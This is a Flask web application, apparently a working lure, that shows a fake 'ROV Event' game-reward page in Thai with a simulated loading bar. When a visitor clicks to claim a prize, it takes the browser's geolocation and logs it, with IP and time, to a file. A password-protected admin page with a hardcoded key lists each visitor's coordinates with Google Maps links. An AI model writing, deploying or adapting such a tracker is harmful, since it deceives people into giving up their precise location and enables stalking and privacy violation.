from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)

ADMIN_KEY = "0949205717As"

@app.route("/")
def home():
    return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>ROV Event</title>

<style>
body {
    margin: 0;
    font-family: Arial;
    background: linear-gradient(180deg, #0f0f1f, #000);
    color: white;
    text-align: center;
}

/* หน้าโหลด */
#loading {
    position: fixed;
    width: 100%;
    height: 100%;
    background: black;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
}

.bar {
    width: 200px;
    height: 10px;
    background: #333;
    margin-top: 20px;
}

.fill {
    height: 100%;
    width: 0%;
    background: #6c5ce7;
}

/* หน้าเกม */
#main {
    display: none;
    padding-top: 120px;
}

.btn {
    padding: 15px 30px;
    background: #6c5ce7;
    border: none;
    border-radius: 10px;
    color: white;
    font-size: 18px;
    cursor: pointer;
}

.btn:hover {
    background: #a29bfe;
}
</style>
</head>

<body>

<div id="loading">
    <h2>Loading Game...</h2>
    <div class="bar"><div class="fill" id="fill"></div></div>
</div>

<div id="main">
    <h1>🎮 ROV EVENT</h1>
    <p>รับของรางวัลพิเศษ</p>
    <button class="btn" onclick="getLocation()">รับของ</button>
</div>

<script>
// โหลดหลอก
let i = 0;
let interval = setInterval(() => {
    i++;
    document.getElementById("fill").style.width = i + "%";
    if(i >= 100){
        clearInterval(interval);
        document.getElementById("loading").style.display = "none";
        document.getElementById("main").style.display = "block";
    }
}, 30);

// ขอ location
function getLocation(){
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(sendData);
    } else {
        alert("ไม่รองรับ");
    }
}

function sendData(pos){
    fetch("/location", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude
        })
    }).then(()=>{
        alert("รับของสำเร็จ!");
    });
}
</script>

</body>
</html>
"""

@app.route("/location", methods=["POST"])
def location():
    data = request.get_json()
    lat = data.get("lat")
    lon = data.get("lon")
    ip = request.remote_addr
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("log.txt", "a") as f:
        f.write(f"{time}|{ip}|{lat},{lon}\n")

    return jsonify({"ok": True})


@app.route("/admin")
def admin():
    key = request.args.get("key")
    if key != ADMIN_KEY:
        return "Access Denied ❌"

    rows = ""
    try:
        with open("log.txt") as f:
            for line in f:
                t, ip, loc = line.strip().split("|")
                lat, lon = loc.split(",")
                link = f"https://www.google.com/maps?q={lat},{lon}"

                rows += f"""
                <tr>
                    <td>{t}</td>
                    <td>{ip}</td>
                    <td>{lat},{lon}</td>
                    <td><a href="{link}" target="_blank">📍 Map</a></td>
                </tr>
                """
    except:
        rows = "<tr><td colspan=4>No data</td></tr>"

    return f"""
    <html><body style="background:#111;color:white">
    <h1>📊 ADMIN</h1>
    <table border=1 width=100%>
    <tr><th>Time</th><th>IP</th><th>Location</th><th>Map</th></tr>
    {rows}
    </table>
    </body></html>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
